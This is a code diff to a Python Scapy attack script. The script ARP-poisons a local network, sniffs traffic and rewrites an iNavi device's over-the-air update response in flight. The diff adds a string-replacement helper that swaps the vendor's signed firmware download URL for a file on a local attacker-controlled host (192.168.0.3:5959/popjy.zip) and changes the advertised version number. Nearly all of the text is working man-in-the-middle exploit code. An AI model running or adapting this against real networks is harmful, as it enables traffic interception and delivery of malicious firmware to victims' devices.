@@ -48,11 +48,14 @@ def chk_pkt(pkt):
             return 0
     return 1
 
-def repair(sIp, tIp, sMac, tMac):
-    print "repair"
+def recover(sIp, tIp, sMac, tMac):
+    print "recover"
     arppkt = Ether(dst = sMac, src = MyMac)/ARP(op=ARP.is_at, hwsrc=tMac, psrc=tIp, hwdst=sMac, pdst=sIp)
     sendp(arppkt, iface=InterFace)
 
+def chg_str(pkt, s1, s2):
+    pkt[Raw].load = pkt[Raw].load.replace(s1, s2)
+    return pkt
 
 def cb(pkt):
     flag = chk_pkt(pkt)
@@ -63,13 +66,17 @@ def cb(pkt):
         if "OTA" in str(pkt):
             #pkt.show2()
             befLen = len(pkt)
-            new_pkt[Raw].load = new_pkt[Raw].load.replace("Version=\'UFI22\'", "Version=\'UFI33\'")
-            new_pkt[Raw].load = new_pkt[Raw].load.replace("UpdateMessage=\'.\'", "UpdateMessage=\'PizzaSch001\'")
+            new_pkt = chg_str(new_pkt, "Version=\'UFI22\'", "Version=\'UFI33\'")
+            new_pkt = chg_str(new_pkt, "http://liveupdate3.inavi.com/inaviX1DASH/util/os/full_runa-ota-RNA.UFI22-signed.zip", "http://192.168.0.3:5959/popjy.zip")
+            #new_pkt = chg_str(new_pkt, "http://liveupdate3.inavi.com/inaviX1DASH/util/os/full_runa-ota-RNA.UFI22-signed.zip", "http://ftp.kaist.ac.kr/doxygen/Doxygen-1.8.9.dmg")
+            #new_pkt = chg_str(new_pkt, "http://liveupdate3.inavi.com/inaviX1DASH/util/os/full_runa-ota-RNA.UFI22-signed.zip", "http://dn.cdn3.inavi.com/_idns_data/1705/_Inavi/inavi3d_all_B12941.zip")
+            new_pkt = chg_str(new_pkt, "UpdateMessage=\'.\'", "UpdateMessage=\'PizzaSch001\'")
+            #new_pkt = chg_str(new_pkt, "FileSize=\'167697268\'", "FileSize=\'167670340\'")
             del new_pkt[IP].chksum
             new_pkt[IP].len += len(new_pkt) - befLen
             del new_pkt[TCP].chksum
-            repair(SenderIp, TargetIp, SenderMac, TargetMac)
             new_pkt.show2()
+            recover(SenderIp, TargetIp, SenderMac, TargetMac)
             sendp(new_pkt, iface=InterFace)
             sys.exit(0)
         sendp(new_pkt, iface=InterFace)
@@ -81,10 +88,10 @@ def cb(pkt):
 
 findMacAddr()
 
-repair(SenderIp, TargetIp, SenderMac, TargetMac)
+recover(SenderIp, TargetIp, SenderMac, TargetMac)
 raw_input(">")
 #poison_bidirect(SenderIp, TargetIp, SenderMac, TargetMac)
 poison(SenderIp, TargetIp, SenderMac)
 #raw_input(">")
-#repair(SenderIp, TargetIp, SenderMac, TargetMac)
+#recover(SenderIp, TargetIp, SenderMac, TargetMac)
 sniff(iface=InterFace, prn=cb)
